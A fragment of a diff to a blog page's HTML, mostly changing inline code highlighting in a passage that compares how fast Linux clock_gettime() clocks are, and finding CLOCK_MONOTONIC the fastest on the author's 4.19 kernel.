-<p><code><span class="highlight-candombe-inline"><span class="n">clock_gettime</span><span class="p">()</span><span class="w"></span></span></code> with <code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC_RAW</span><span class="w"></span></span></code> is not bad but it is at least 8 times slower than <code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC</span><span class="w"></span></span></code>.</p>
+<p><code><span class="highlight-candombe-inline"><span class="n">clock_gettime</span><span class="p">()</span></span></code> with <code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC</span></span></code> is the winner, at least in my 4.19 kernel, with a minimum delta of 80 to 86 nanoseconds.</p>
+<p>In second place <code><span class="highlight-candombe-inline"><span class="n">clock_gettime</span><span class="p">()</span></span></code> with <code><span class="highlight-candombe-inline"><span class="n">CLOCK_PROCESS_CPUTIME_ID</span></span></code> or <code><span class="highlight-candombe-inline"><span class="n">CLOCK_THREAD_CPUTIME_ID</span></span></code>. Good performance, roughly 4 or 5 times slower than <code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC</span></span></code>.</p>
+<p><code><span class="highlight-candombe-inline"><span class="n">clock_gettime</span><span class="p">()</span></span></code> with <code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC_RAW</span></span></code> is not bad but it is at least 8 times slower than <code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC</span></span></code>.</p>
 <p>The rest of the clocks are <strong>not</strong> useful.</p>
 <script src="https://utteranc.es/client.js"
         repo="book-of-gehn/book-of-gehn.github.io"
